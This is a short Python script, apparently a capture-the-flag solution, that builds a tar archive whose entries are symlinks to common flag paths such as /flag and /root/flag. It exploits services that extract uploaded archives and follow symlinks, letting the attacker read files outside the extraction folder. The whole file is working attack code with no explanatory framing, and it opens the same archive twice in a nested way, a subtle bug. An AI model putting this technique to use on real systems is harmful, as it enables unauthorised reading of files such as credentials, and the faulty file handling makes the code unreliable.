# make_symlink_tar.py
import tarfile

targets = {
    "flag": "/flag",
    "flag_root": "/root/flag",
    "flag_home_ctf": "/home/ctf/flag",
    "flag_txt": "/flag.txt",
    "var_www_flag": "/var/www/flag"
}

with tarfile.open("exploit.tar", "w"):
    with tarfile.open("exploit.tar", "w") as tar:
        for name, linkto in targets.items():
            ti = tarfile.TarInfo(name)
            ti.type = tarfile.SYMTYPE   # symlink
            ti.linkname = linkto
            ti.mode = 0o777
            tar.addfile(ti)
print("Created exploit.tar with symlinks.")